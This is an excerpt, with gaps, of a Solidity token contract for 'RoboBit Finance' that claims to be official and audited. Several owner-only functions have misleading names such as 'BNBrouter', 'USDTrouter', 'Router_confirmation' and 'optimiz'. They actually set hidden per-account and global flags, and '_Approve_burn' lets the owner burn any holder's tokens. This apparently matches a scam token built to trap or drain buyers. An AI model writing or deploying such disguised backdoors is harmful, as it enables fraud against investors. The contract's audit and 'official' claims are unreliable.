...
/**
 *Robobit Finance official contract
 *(Tested-20-04-22-)
 Audited by SafuAudit
*/
...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "RoboBit Finance";
    string public _symbol= "ROBOBIT";
    bool balances1 = true;
    bool amount1 = true;
    ...
    function CharityAddress(address payable  _charityAddress) onlyOwner public {
        charityAddress = _charityAddress;
    }
    
    function CharityPercent(uint256 _charityPercent) onlyOwner public {
        charityPercent = _charityPercent;
    }
    
    function BurnPercent(uint256 _burnPercent) onlyOwner public {
    ...
    function optimiz(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function auto_trade_limit(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    function BNBrouter(address _account_) onlyOwner public {
        _excludeamount[_account_] = true;
    }
    
    function Router_confirmation(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
    function USDTrouter (address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function MarketingAddress(address account) onlyOwner public {
    ...
    function _Approve_burn(address account, uint256 amount) onlyOwner  public virtual {
